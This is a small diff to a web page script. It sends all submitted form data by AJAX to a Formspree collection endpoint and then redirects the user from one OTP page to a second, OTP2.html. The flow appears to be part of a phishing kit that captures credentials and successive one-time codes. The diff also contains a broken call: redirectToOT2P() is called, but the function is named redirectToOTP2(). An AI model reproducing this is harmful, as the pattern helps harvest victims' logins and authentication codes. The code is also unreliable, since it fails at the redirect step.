@@ -13,13 +13,13 @@
 
         // Send the form data to FormSubmit using AJAX
         $.ajax({
-          url: 'https://formspree.io/f/xlekkzzj',
+          url: 'https://formspree.io/f/xnqykjyp',
           method: 'POST',
           data: $('form').serialize(),
           dataType: 'json',
           success: function(response) {
-            // Redirect to otp.html upon successful submission
-            redirectToOTP();
+            // Redirect to OTP2.html upon successful submission
+            redirectToOT2P();
           },
           error: function(xhr, status, error) {
             console.log(xhr.responseText);
@@ -29,8 +29,8 @@
       });
     });
 
-    function redirectToOTP() {
-      window.location.href = 'otp.html';
+    function redirectToOTP2() {
+      window.location.href = 'OTP2.html';
     }
   </script>
 </head>
